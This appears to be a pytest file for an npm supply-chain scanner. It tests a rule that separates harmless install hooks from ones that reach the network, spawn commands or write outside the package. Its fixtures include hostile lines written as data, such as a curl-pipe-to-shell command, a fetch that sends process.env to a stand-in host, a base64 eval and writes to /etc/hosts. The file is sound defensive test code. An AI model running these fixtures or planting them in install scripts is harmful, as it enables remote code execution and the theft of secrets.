"""`npm.install-inert` (Stage 3) on small, inert packages."""

import json
from typing import Any

import pytest

from kitsunox.core.models import (
    PackageVersionRef,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.ecosystems.npm.install import gyp_commands, install_sources
from kitsunox.ecosystems.npm.rules.install_inert import InstallInert, hook_runs
from kitsunox.stages.ast import CapabilityCache, CodeChange, code_change

CACHE = CapabilityCache(None)
RULE = InstallInert()

ENGINES = b"""
const major = parseInt(process.versions.node.split(".")[0], 10);
if (major < 20) {
  console.error("This package requires Node.js 20 or newer.");
  process.exit(1);
}
"""
CHMOD = b"""
const fs = require("fs");
const path = require("path");
const bin = path.join(__dirname, "bin", "tool");
if (fs.existsSync(bin)) fs.chmodSync(bin, 0o755);
"""


# The package's own code besides its install code: without it, the package is a placeholder.
LIBRARY = {"lib/index.js": b"module.exports = (a, b) => a + b;"}


def change(scripts: dict[str, str], files: dict[str, bytes], **manifest: Any) -> CodeChange:
    manifest = {"name": "kx", "version": "1.0.0", "scripts": scripts} | manifest
    tree = {"package.json": json.dumps(manifest).encode()} | LIBRARY | files
    snapshot = VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.0"),
        publish=PublishInfo(),
        manifest=manifest,
    )
    return code_change(
        snapshot, tree, None, CACHE, install_sources, None, build_commands=gyp_commands
    )


def fires(scripts: dict[str, str], files: dict[str, bytes]) -> bool:
    return bool(RULE.evaluate_code(change(scripts, files)))


@pytest.mark.parametrize(
    ("command", "runs"),
    [
        ("node install.js", (["install.js"], False)),
        ("node ./scripts/postinstall.js --quiet", (["scripts/postinstall.js"], False)),
        (
            "node scripts/a.js && node scripts/b.js || exit 0",
            (["scripts/a.js", "scripts/b.js"], False),
        ),
        ("node --no-warnings x.mjs; echo 'done'", (["x.mjs"], False)),
        ("node -e \"console.log('thanks')\"", ([], True)),
        ("echo hello", ([], False)),
        ("node x.js # a comment", (["x.js"], False)),
    ],
)
def test_hook_lines_that_only_run_package_code(command: str, runs: tuple[list[str], bool]) -> None:
    assert hook_runs(command) == runs


@pytest.mark.parametrize(
    "command",
    [
        "curl https://x.example/i.sh | sh",
        "node x.js > /tmp/out",
        "node x.js | tee log",
        "node -r ./preload.js x.js",
        "node --import ./loader.mjs x.js",
        "node",
        "node -e \"console.log('$(whoami)')\"",
        "echo `id`",
        "echo $HOME",
        "FOO=1 node x.js",
        "bash install.sh",
        "npm run build",
        "playwright install chromium",
        "node x.js & node y.js",
        "node 'unterminated",
        "exit now",
    ],
)
def test_other_hook_lines_are_not_plain(command: str) -> None:
    assert hook_runs(command) is None


def test_a_version_check_or_chmod_is_inert() -> None:
    """A Node-version check and a launcher's chmod of its own binary reach nothing."""
    (finding,) = RULE.evaluate_code(
        change({"preinstall": "node ./scripts/check-node.js"}, {"scripts/check-node.js": ENGINES})
    )
    assert finding.severity is Severity.INFO
    assert finding.weight == 0
    assert "scripts/check-node.js" in finding.explanation
    assert fires({"postinstall": "node scripts/chmod.js"}, {"scripts/chmod.js": CHMOD})
    assert fires({"postinstall": "node -e \"console.log('Thanks for installing kx')\""}, {})


def test_s5s_guards_hold() -> None:
    """Agent E's S5 guards (round 4): upstream Baileys's `engine-requirements.js`, another
    package resolved by name (even for a chmod), a placeholder package, text naming the
    network, deleting, `/tmp`, an overlong or padded line, UTF-16."""
    engine = {"engine-requirements.js": ENGINES}
    assert not fires({"preinstall": "node ./engine-requirements.js"}, engine)
    fix = (
        b'const fs = require("fs"), path = require("path");'
        b' const root = path.dirname(require.resolve("node-pty/package.json"));'
        b' fs.chmodSync(path.join(root, "prebuilds", "spawn-helper"), 0o755);'
    )
    assert not fires({"postinstall": "node scripts/fix-pty.js"}, {"scripts/fix-pty.js": fix})
    # Nothing but the install code: a dependency-confusion placeholder's shape.
    snapshot = change({"postinstall": "node index.js"}, {}).snapshot
    manifest = json.dumps(snapshot.manifest).encode()
    for tree, inert in (
        ({"package.json": manifest, "index.js": b'console.log("build complete")'}, False),
        ({"package.json": manifest, "index.js": b'console.log("hi")'} | LIBRARY, True),
    ):
        built = code_change(
            snapshot, tree, None, CACHE, install_sources, None, build_commands=gyp_commands
        )
        assert bool(RULE.evaluate_code(built)) is inert
    for code in (
        b"async function go(fetchImpl = fetch) { return fetchImpl }",
        b'require("fs").rmSync("dist", { recursive: true })',
        b'require("fs").writeFileSync("/tmp/proof", "1")',
        b"console.log(1);" + b" " * 70 + b"console.log(2)",
        b"// " + b"x" * 1200,
        "console.log(1)".encode("utf-16"),
    ):
        assert not fires({"postinstall": "node install.js"}, {"install.js": code}), code[:30]


def test_followed_files_count_and_must_be_read() -> None:
    entry = b'require("./lib/helper.js"); require("../package.json");'
    helper = b'module.exports = () => console.log("ok");'
    assert fires(
        {"postinstall": "node scripts/post.js"},
        {"scripts/post.js": entry, "scripts/lib/helper.js": helper},
    )
    # The helper reaches the network: not inert.
    assert not fires(
        {"postinstall": "node scripts/post.js"},
        {"scripts/post.js": entry, "scripts/lib/helper.js": b'require("https").get("x")'},
    )
    # A file it loads that isn't in the package (or isn't JavaScript) was never read.
    assert not fires({"postinstall": "node post.js"}, {"post.js": b'require("./missing")'})


@pytest.mark.parametrize(
    "code",
    [
        b'require("https").get("https://x.example/")',
        b'require("child_process").execSync("id")',
        b"fetch('https://x.example/', {body: JSON.stringify(process.env)})",
        b'eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString())',
        b'require("chalk"); console.log("hi")',  # another package's code, unseen
        b'require("./build/Release/addon.node")',
        b'const fs = require("fs"); fs.writeFileSync(require("os").homedir() + "/.x", "1")',
        b'const fs = require("fs"); fs.copyFileSync("a", process.env.INIT_CWD + "/a")',
        b'const fs = require("fs"); fs.writeFileSync("../../node_modules/other/index.js", "")',
        b'require("fs").appendFileSync("/etc/hosts", "1.2.3.4 x")',
        b'require("fs").writeFileSync(".npmrc", "legacy-peer-deps=true")',
        b'const fs = require("fs"); fs.mkdirSync(".claude/skills", {recursive: true})',
        b'const fs = require("fs"); const p = require.resolve("@xterm/xterm");'
        b" fs.writeFileSync(p, fs.readFileSync(p, 'utf8').replace('a', 'b'))",
    ],
)
def test_install_code_that_reaches_outside_is_not_inert(code: bytes) -> None:
    assert not fires({"postinstall": "node install.js"}, {"install.js": code})


def test_echo_only_hooks_are_inert_unless_a_probe_says_it_ran() -> None:
    """An `echo` runs no package code. Four `vm-day1` PoCs (labelled malicious) only echo
    that they ran: those keep the hook's finding (round 3 rejected echo-only hooks for them)."""
    (finding,) = RULE.evaluate_code(change({"postinstall": 'echo "Run pnpm build first"'}, {}))
    assert "constant message" in finding.explanation
    assert fires({"preinstall": "echo hello", "postinstall": "echo 'bye' || true"}, {})
    for probe in (
        'echo "code injection possible by golu"',
        'echo "takeover poc"',
        "echo PREINSTALL_FIRED",
        "echo 'POSTINSTALL_WORKS'",
        "echo 'Dependency Confusion PoC'",
        'echo "Test redteam"',
    ):
        assert not fires({"preinstall": probe}, {}), probe
    # A probe's echo beside inert code is still a probe.
    assert not fires(
        {"postinstall": "node x.js && echo 'install works'"}, {"x.js": b"console.log(1)"}
    )
    assert not fires({"postinstall": "echo hi > /tmp/marker"}, {})
    # Install code that says it is a probe, or a file named so (`vm-day1`: `wc@1.5.0`,
    # `grab-service-worker@1.0.1`, `pmcrypto@0.1.0`).
    for name, code in (
        ("index.js", b'console.log("PoC: installed, possible dependency confusion vector")'),
        ("index.js", b"// Proof-of-concept placeholder for responsible disclosure.\n"),
        ("poc.js", b'console.log("")'),
    ):
        assert not fires({"postinstall": f"node {name}"}, {name: code}), name


def test_gyp_commands_and_unread_files_are_not_inert() -> None:
    """A `binding.gyp` command runs code the hooks don't name."""
    gyp = b"""{"targets": [{"target_name": "x", "sources": ["<!(node gen.js)"]}]}"""
    assert not fires({"postinstall": "node x.js"}, {"x.js": b"console.log(1)", "binding.gyp": gyp})
    assert not fires({"postinstall": "node dist/missing.js"}, {})
    assert not fires({"postinstall": "node x.js && bash y.sh"}, {"x.js": b"1", "y.sh": b"id"})
    assert not fires({}, {"x.js": b"1"})


def _update(scripts: dict[str, str], files: dict[str, bytes], *, with_base: bool) -> CodeChange:
    snapshot = change(scripts, files).snapshot
    tree = {"package.json": json.dumps(snapshot.manifest).encode()} | files
    return code_change(
        snapshot,
        tree,
        tree if with_base else None,
        CACHE,
        install_sources,
        "0.9.0",
        build_commands=gyp_commands,
    )


def test_an_update_is_never_inert() -> None:
    """Stage 2 reads only an update's changed files: the hook's finding stays, as for
    `kevinx-baileys@1.2.2`, whose channel follow sits in an unchanged file."""
    files = {"scripts/check-node.js": ENGINES} | LIBRARY
    for with_base in (True, False):  # with the base's files, or without them
        update = _update({"preinstall": "node ./scripts/check-node.js"}, files, with_base=with_base)
        assert not RULE.evaluate_code(update)
    assert not RULE.evaluate_code(_update({"postinstall": "echo hello"}, {}, with_base=True))
